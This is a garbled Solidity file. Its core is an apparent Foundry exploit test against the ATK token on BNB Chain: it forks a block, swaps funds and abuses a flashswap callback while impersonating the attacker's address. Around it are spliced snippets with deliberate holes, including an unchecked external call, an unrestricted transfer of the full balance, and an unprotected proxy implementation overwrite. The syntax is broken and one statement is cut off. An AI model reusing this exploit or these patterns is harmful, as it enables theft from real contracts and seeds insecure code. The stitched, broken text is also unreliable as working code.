
// Injected data-trading logic
pragma solidity ^0.8.0;
contract DataContract {

    function grantAccessToData(address requester, string memory dataId) public {
        emit AccessGranted(requester, dataId);
    }
}
pragma solidity ^0.8.10;

```solidity;

;
;
contract ContractTest is DSTest{
    IERC20 WBNB = IERC20(0xbb4CdB9CBd36B01bD1cBaEBF2De08d9173bc095c);
    IERC20 ATK = IERC20(0x9cB928Bf50ED220aC8f703bce35BE5ce7F56C99c);
    IERC20 USDT = IERC20(0x55d398326f99059fF775485246999027B3197955);
    Uni_Router_V2 Router = Uni_Router_V2(0x10ED43C718714eb63d5aA57B78B54704E256024E);
    Uni_Pair_V2 Pair = Uni_Pair_V2(0xd228fAee4f73a73fcC73B6d9a1BD25EE1D6ee611);
    uint swapamount;
    CheatCodes cheats = CheatCodes(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    function setUp() public {
        cheats.createSelectFork("bsc", 22102838)};
    function testExploit() public{
        address(WBNB).call{value: 2 ether}("");
        WBNBToUSDT();
        swapamount = USDT.balanceOf(address(Pair)) - 3 * 1e18;
        Pair.swap(swapamount, 0, address(this), new bytes(1));
        emit log_named_decimal_uint("[End] Attacker ATK balance after exploit",
            ATK.balanceOf(address(0xD7ba198ce82f4c46AD8F6148CCFDB41866750231)),;
            18)};
    function pancakeCall(address sender, uint256 amount0, uint256 amount1, bytes calldata data) public {
        cheats.startPrank(0xD7ba198ce82f4c46AD8F6148CCFDB41866750231);
        address(0x96bF2E6CC029363B57Ffa5984b943f825D333614).
function duplicateSubmission(bytes memory signedData) public {
    externalContract.call(signedData)}
function unsafeTransfer(address to) public {
    to.call{value: address(this).balance}("")}
address public implementation;
function overwriteImplementation(address impl) public {
    implementation = impl}